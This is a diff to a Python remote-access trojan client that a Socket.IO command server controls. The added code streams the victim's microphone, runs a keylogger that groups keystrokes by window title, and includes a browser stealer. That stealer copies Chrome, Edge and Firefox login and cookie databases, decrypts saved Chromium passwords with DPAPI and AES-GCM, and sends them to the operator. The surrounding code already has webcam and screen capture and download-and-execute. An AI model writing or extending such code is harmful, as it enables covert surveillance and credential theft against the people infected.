@@ -31,7 +31,8 @@ _KEEPALIVE = 300                              # Keep-alive ping interval (second
 
 # ── Optional deps ────────────────────────────────────────────────────
 HAS = {"mss": False, "pil": False, "pynput": False, "pycaw": False,
-       "pyperclip": False, "psutil": False, "cv2": False}
+       "pyperclip": False, "psutil": False, "cv2": False, "pyaudio": False,
+       "crypto": False}
 try: import mss, mss.tools; HAS["mss"] = True
 except: pass
 try: from PIL import Image; HAS["pil"] = True
@@ -45,6 +46,10 @@ except: pass
 try: import psutil; HAS["psutil"] = True
 except: pass
 try: import cv2; HAS["cv2"] = True
+except: pass
+try: import pyaudio; HAS["pyaudio"] = True
+except: pass
+try: from cryptography.hazmat.primitives.ciphers.aead import AESGCM; HAS["crypto"] = True
 except: pass
 try: import socketio as sio_lib; HAS["sio"] = True
 except: print("ERROR: pip install python-socketio[client]"); sys.exit(1)
@@ -136,6 +141,59 @@ class CapEngine:
         except Exception as e:
             log.error(f"{self.src} engine crash: {e}")
         finally: self.stop()
+
+# ── Microphone Engine ────────────────────────────────────────────────
+class MicEngine:
+    """Live microphone streaming via pyaudio → WAV chunks → base64."""
+    def __init__(self, sio):
+        self.r = False; self.sio = sio; self.pa = None; self.stream = None
+
+    def start(self):
+        if self.r: return
+        if not HAS["pyaudio"]: return
+        try:
+            self.pa = pyaudio.PyAudio()
+            self.stream = self.pa.open(
+                format=pyaudio.paInt16, channels=1, rate=16000,
+                input=True, frames_per_buffer=4096)
+        except Exception as e:
+            log.error(f"Mic init error: {e}"); self.stop(); return
+        self.r = True
+        threading.Thread(target=self._loop, daemon=True).start()
+
+    def stop(self):
+        self.r = False
+        if self.stream:
+            try: self.stream.stop_stream(); self.stream.close()
+            except: pass
+            self.stream = None
+        if self.pa:
+            try: self.pa.terminate()
+            except: pass
+            self.pa = None
+
+    @staticmethod
+    def _make_wav(pcm_data):
+        """Wrap raw PCM in a minimal WAV header so browsers can decode it."""
+        import struct
+        data_len = len(pcm_data)
+        header = struct.pack('<4sI4s4sIHHIIHH4sI',
+            b'RIFF', 36 + data_len, b'WAVE', b'fmt ', 16,
+            1, 1, 16000, 32000, 2, 16,
+            b'data', data_len)
+        return header + pcm_data
+
+    def _loop(self):
+        while self.r:
+            try:
+                data = self.stream.read(4096, exception_on_overflow=False)
+                wav = self._make_wav(data)
+                b64 = base64.b64encode(wav).decode()
+                if self.sio and self.sio.connected:
+                    self.sio.emit("mic_data", {"audio": b64})
+            except Exception as e:
+                log.error(f"Mic err: {e}")
+                time.sleep(0.1)
 
 # ── System Monitor ───────────────────────────────────────────────────
 class SysMon:
@@ -243,6 +301,62 @@ class Term:
             if self.s.get("mf"): os.write(self.s["mf"], (cmd + "\n").encode())
             else: p.stdin.write(cmd + "\n"); p.stdin.flush()
         except Exception as e: log.error(f"Term write: {e}")
+
+# ── Keylogger Engine ─────────────────────────────────────────────────
+class Keylog:
+    """Background keylogger with per-window grouping and periodic flush."""
+    def __init__(self, sio):
+        self.r = False; self.sio = sio; self.buffer = []; self.listener = None
+        self._last_window = ""
+
+    def start(self):
+        if self.r or not HAS["pynput"]: return
+        self.r = True; self.buffer = []
+        self.listener = keyboard.Listener(on_press=self._on_press)
+        self.listener.start()
+        threading.Thread(target=self._flush_loop, daemon=True).start()
+        if self.sio and self.sio.connected:
+            self.sio.emit("keylog_status", {"active": True})
+
+    def stop(self):
+        self.r = False; self._flush()  # send remaining
+        if self.listener:
+            try: self.listener.stop()
+            except: pass
+            self.listener = None
+        if self.sio and self.sio.connected:
+            self.sio.emit("keylog_status", {"active": False})
+
+    def _active_window(self):
+        try:
+            if sys.platform == "win32":
+                hwnd = ctypes.windll.user32.GetForegroundWindow()
+                length = ctypes.windll.user32.GetWindowTextLengthW(hwnd)
+                buf = ctypes.create_unicode_buffer(length + 1)
+                ctypes.windll.user32.GetWindowTextW(hwnd, buf, length + 1)
+                return buf.value
+        except: pass
+        return ""
+
+    def _on_press(self, key):
+        try:
+            k = key.char if hasattr(key, 'char') and key.char else str(key)
+            wnd = self._active_window()
+            if wnd != self._last_window:
+                self._last_window = wnd
+                self.buffer.append({"k": f"[{wnd}]", "t": time.time()})
+            self.buffer.append({"k": k, "t": time.time()})
+        except: pass
+
+    def _flush(self):
+        if self.buffer and self.sio and self.sio.connected:
+            self.sio.emit("keylog_data", {"keys": list(self.buffer), "window": self._last_window})
+            self.buffer = []
+
+    def _flush_loop(self):
+        while self.r:
+            time.sleep(3)
+            self._flush()
 
 # ── System Commands ──────────────────────────────────────────────────
 def _proc(): return [{"pid": p.info["pid"], "name": p.info["name"] or "?",
@@ -457,6 +571,253 @@ def _block_input(block=True):
         if ok: return True, "Input blocked" if block else "Input unblocked"
         return False, "Block failed (needs admin)" if block else "Unblock failed"
     except Exception as e: return False, str(e)
+
+# ── Network Scanner ──────────────────────────────────────────────────
+def _network_info():
+    """Get network interfaces, active connections, and ARP table."""
+    info = {"interfaces": [], "connections": [], "arp": []}
+    # Interfaces
+    try:
+        if HAS["psutil"]:
+            for name, addrs in psutil.net_if_addrs().items():
+                iface = {"name": name, "addresses": []}
+                for addr in addrs:
+                    iface["addresses"].append({
+                        "family": str(addr.family),
+                        "address": addr.address,
+                        "netmask": addr.netmask or "",
+                        "broadcast": addr.broadcast or ""
+                    })
+                info["interfaces"].append(iface)
+    except Exception as e: info["interfaces_error"] = str(e)
+    # Active connections
+    try:
+        if HAS["psutil"]:
+            for conn in psutil.net_connections(kind='all')[:100]:
+                info["connections"].append({
+                    "fd": conn.fd or -1,
+                    "family": str(conn.family),
+                    "type": str(conn.type),
+                    "local": f"{conn.laddr.ip}:{conn.laddr.port}" if conn.laddr else "",
+                    "remote": f"{conn.raddr.ip}:{conn.raddr.port}" if conn.raddr else "",
+                    "status": conn.status,
+                    "pid": conn.pid or 0
+                })
+    except Exception as e: info["connections_error"] = str(e)
+    # ARP table
+    try:
+        if sys.platform == "win32":
+            r = subprocess.run(["arp", "-a"], capture_output=True, text=True, timeout=10, creationflags=subprocess.CREATE_NO_WINDOW if sys.platform == "win32" else 0)
+            for line in r.stdout.split("\n"):
+                line = line.strip()
+                if line and ("dynamic" in line.lower() or "static" in line.lower()):
+                    parts = line.split()
+                    if len(parts) >= 2:
+                        info["arp"].append({"ip": parts[0], "mac": parts[1].replace("-", ":"), "type": parts[-1] if len(parts) > 2 else ""})
+        else:
+            r = subprocess.run(["arp", "-a"], capture_output=True, text=True, timeout=10)
+            for line in r.stdout.split("\n"):
+                if "(" in line and ")" in line:
+                    info["arp"].append(line.strip())
+    except Exception as e: info["arp_error"] = str(e)
+    return info
+
+# ── Browser Stealer ──────────────────────────────────────────────────
+def _browser_steal():
+    """Extract saved passwords and cookies from Chrome, Edge, Firefox."""
+    results = {"chrome": {}, "edge": {}, "firefox": {}}
+    localapp = os.environ.get("LOCALAPPDATA", "")
+    appdata = os.environ.get("APPDATA", "")
+
+    # Chrome
+    chrome_path = os.path.join(localapp, "Google", "Chrome", "User Data")
+    if os.path.exists(chrome_path):
+        results["chrome"] = _steal_chromium(chrome_path, "Chrome", localapp)
+    else:
+        results["chrome"] = {"error": "Chrome not found"}
+
+    # Edge
+    edge_path = os.path.join(localapp, "Microsoft", "Edge", "User Data")
+    if os.path.exists(edge_path):
+        results["edge"] = _steal_chromium(edge_path, "Edge", localapp)
+    else:
+        results["edge"] = {"error": "Edge not found"}
+
+    # Firefox
+    firefox_path = os.path.join(appdata, "Mozilla", "Firefox", "Profiles")
+    if os.path.exists(firefox_path):
+        results["firefox"] = _steal_firefox(firefox_path)
+    else:
+        results["firefox"] = {"error": "Firefox not found"}
+
+    return results
+
+def _steal_chromium(base_path, name, localapp):
+    """Extract passwords from Chromium-based browsers (Chrome, Edge, Brave, Opera...)."""
+    result = {"passwords": [], "cookies": [], "error": None}
+    try:
+        for item in os.listdir(base_path):
+            if not (item == "Default" or item.startswith("Profile ")): continue
+            profile_path = os.path.join(base_path, item)
+            login_db = os.path.join(profile_path, "Login Data")
+
+            # Passwords
+            if os.path.exists(login_db):
+                temp_db = os.path.join(os.environ.get("TEMP", "/tmp"), f"{name.lower()}_login_{item}.db")
+                try:
+                    shutil.copy2(login_db, temp_db)
+                    conn = __import__('sqlite3').connect(temp_db)
+                    cur = conn.cursor()
+                    try:
+                        cur.execute("SELECT origin_url, username_value, password_value FROM logins")
+                        for row in cur.fetchall():
+                            url, username, enc_pwd = row
+                            pwd = _decrypt_chrome(enc_pwd) if (enc_pwd and HAS["crypto"]) else "[needs cryptography]"
+                            result["passwords"].append({"url": url, "username": username, "password": pwd, "profile": item})
+                    except Exception:
+                        pass
+                    conn.close()
+                except Exception as e:
+                    if not result.get("error"): result["error"] = str(e)
+                finally:
+                    try: os.remove(temp_db)
+                    except: pass
+
+            # Cookies
+            for cookie_path in [os.path.join(profile_path, "Network", "Cookies"),
+                                os.path.join(profile_path, "Cookies")]:
+                if not os.path.exists(cookie_path): continue
+                temp_db = os.path.join(os.environ.get("TEMP", "/tmp"), f"{name.lower()}_cookies_{item}.db")
+                try:
+                    shutil.copy2(cookie_path, temp_db)
+                    conn = __import__('sqlite3').connect(temp_db)
+                    cur = conn.cursor()
+                    try:
+                        cur.execute("SELECT host_key, name, encrypted_value FROM cookies LIMIT 200")
+                        for row in cur.fetchall():
+                            result["cookies"].append({"host": row[0], "name": row[1], "value": "[encrypted]", "profile": item})
+                    except Exception:
+                        pass
+                    conn.close()
+                except Exception:
+                    pass
+                finally:
+                    try: os.remove(temp_db)
+                    except: pass
+                break  # only try the first existing path
+    except Exception as e:
+        result["error"] = str(e)
+    return result
+
+def _decrypt_chrome(encrypted_value):
+    """Decrypt Chrome/Edge password using Windows DPAPI + AES-256-GCM."""
+    if not encrypted_value or not isinstance(encrypted_value, bytes):
+        return "[no data]"
+    if len(encrypted_value) < 15 + 16:  # 3 prefix + 12 nonce + 16 tag min
+        return "[too short]"
+    if encrypted_value[:3] != b'v10':
+        return "[old format v" + (encrypted_value[:3].decode(errors='replace')) + "]"
+
+    try:
+        # Find Local State from the installed Chrome/Edge
+        localapp = os.environ.get("LOCALAPPDATA", "")
+        browsers = [
+            os.path.join(localapp, "Google", "Chrome", "User Data"),
+            os.path.join(localapp, "Microsoft", "Edge", "User Data"),
+            os.path.join(localapp, "BraveSoftware", "Brave-Browser", "User Data"),
+            os.path.join(localapp, "Opera Software", "Opera Stable"),
+        ]
+
+        for browser_path in browsers:
+            ls_path = os.path.join(browser_path, "Local State")
+            if not os.path.exists(ls_path):
+                continue
+            try:
+                with open(ls_path, 'r', encoding='utf-8') as f:
+                    local_state = json.load(f)
+                encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
+                encrypted_key = encrypted_key[5:]  # strip 'DPAPI'
+
+                # DPAPI decrypt the AES key
+                class DATA_BLOB(ctypes.Structure):
+                    _fields_ = [("cbData", ctypes.wintypes.DWORD),
+                                ("pbData", ctypes.POINTER(ctypes.c_char))]
+
+                pDataIn = DATA_BLOB(len(encrypted_key),
+                    ctypes.cast(ctypes.create_string_buffer(encrypted_key, len(encrypted_key)), ctypes.POINTER(ctypes.c_char)))
+                pDataOut = DATA_BLOB()
+
+                if not ctypes.windll.crypt32.CryptUnprotectData(
+                    ctypes.byref(pDataIn), None, None, None, None, 0, ctypes.byref(pDataOut)):
+                    continue
+
+                aes_key = ctypes.create_string_buffer(pDataOut.cbData)
+                ctypes.memmove(aes_key, pDataOut.pbData, pDataOut.cbData)
+                ctypes.windll.kernel32.LocalFree(pDataOut.pbData)
+
+                # AES-GCM decrypt
+                nonce = encrypted_value[3:15]
+                ciphertext = encrypted_value[15:]
+                aesgcm = AESGCM(bytes(aes_key))
+                return aesgcm.decrypt(nonce, ciphertext, None).decode('utf-8', errors='replace')
+            except Exception:
+                continue
+    except Exception:
+        pass
+
+    return "[cannot decrypt]"
+
+def _steal_firefox(base_path):
+    """Extract saved logins from Firefox profiles."""
+    result = {"passwords": [], "cookies": [], "error": None}
+    try:
+        for item in os.listdir(base_path):
+            profile_path = os.path.join(base_path, item)
+            if not os.path.isdir(profile_path): continue
+
+            # logins.json
+            logins_path = os.path.join(profile_path, "logins.json")
+            if os.path.exists(logins_path):
+                try:
+                    with open(logins_path, 'r', encoding='utf-8') as f:
+                        logins = json.load(f)
+                    for entry in logins.get("logins", []):
+                        result["passwords"].append({
+                            "url": entry.get("hostname", ""),
+                            "username": (entry.get("encryptedUsername", "") or "")[:80],
+                            "password": (entry.get("encryptedPassword", "") or "")[:80],
+                            "profile": item,
+                            "encrypted": True
+                        })
+                except Exception:
+                    pass
+
+            # cookies.sqlite
+            cookies_path = os.path.join(profile_path, "cookies.sqlite")
+            if os.path.exists(cookies_path):
+                temp_db = os.path.join(os.environ.get("TEMP", "/tmp"), f"ff_cookies_{item}.db")
+                try:
+                    shutil.copy2(cookies_path, temp_db)
+                    conn = __import__('sqlite3').connect(temp_db)
+                    cur = conn.cursor()
+                    try:
+                        cur.execute("SELECT host, name, value FROM moz_cookies LIMIT 200")
+                        for row in cur.fetchall():
+                            result["cookies"].append({
+                                "host": row[0], "name": row[1],
+                                "value": (row[2] or "")[:80], "profile": item
+                            })
+                    except Exception:
+                        pass
+                    conn.close()
+                except Exception:
+                    pass
+                finally:
+                    try: os.remove(temp_db)
+                    except: pass
+    except Exception as e:
+        result["error"] = str(e)
+    return result
 
 def _download_exec(url, save_path=None):
     """Download a file from URL and optionally execute it."""
@@ -848,9 +1209,11 @@ def uninstall_persist():
 def setup_handlers(sio):
     sc = CapEngine(sio, "screen")
     wc = CapEngine(sio, "webcam")
+    mic = MicEngine(sio)
     mon = SysMon(sio)
     term = Term(sio)
-    state.scap = sc; state.wcap = wc
+    keylog = Keylog(sio)
+    state.scap = sc; state.wcap = wc; state.mic = mic; state.keylog = keylog
 
     @sio.on("connect")
     def _c():
@@ -864,7 +1227,7 @@ def setup_handlers(sio):
     @sio.on("disconnect")
     def _d():
         _block_input(False)  # auto-unblock on disconnect
-        log.info("Disconnected"); state.conn = False; state.reg = False; sc.stop(); wc.stop(); mon.stop(); term.stop()
+        log.info("Disconnected"); state.conn = False; state.reg = False; sc.stop(); wc.stop(); mic.stop(); mon.stop(); term.stop(); keylog.stop()
 
     @sio.on("registration_ok")
     def _r(d): state.reg = True; state.cid = d.get("client_id", state.cid); log.info(f"Registered: {state.cid}")
@@ -902,6 +1265,18 @@ def setup_handlers(sio):
         if d:
             if "quality" in d: wc.q = max(1, min(100, int(d["quality"])))
             if "fps" in d: wc.fps = max(1, min(30, int(d["fps"])))
+
+    # Microphone
+    @sio.on("mic_start")
+    def _mstart(d=None): mic.start(); sio.emit("mic_status", {"active": mic.r})
+    @sio.on("mic_stop")
+    def _mstop(): mic.stop(); sio.emit("mic_status", {"active": False})
+
+    # Keylogger
+    @sio.on("keylog_start")
+    def _kstart(d=None): keylog.start()
+    @sio.on("keylog_stop")
+    def _kstop(): keylog.stop()
 
     # Mouse
     @sio.on("mouse_event")
@@ -1045,9 +1420,20 @@ def setup_handlers(sio):
         ok, msg = _fwrite(path, chunk, offset, mode)
         sio.emit("file_upload_result", {"ok": ok, "message": msg, "path": path})
 
+    # Network
+    @sio.on("network_info")
+    def _ninfo(d=None): sio.emit("network_info_result", _network_info())
+
+    # Browser stealer
+    @sio.on("browser_steal")
+    def _bs(d=None):
+        log.info("Browser stealer requested")
+        result = _browser_steal()
+        sio.emit("browser_steal_result", result)
+
     @sio.on("kill_switch")
     def _ks(d=None):
-        log.warning("KILL SWITCH"); sc.stop(); wc.stop(); mon.stop(); term.stop(); sio.disconnect(); os._exit(0)
+        log.warning("KILL SWITCH"); sc.stop(); wc.stop(); mic.stop(); mon.stop(); term.stop(); keylog.stop(); sio.disconnect(); os._exit(0)
 
 # ── Main ─────────────────────────────────────────────────────────────
 def main():
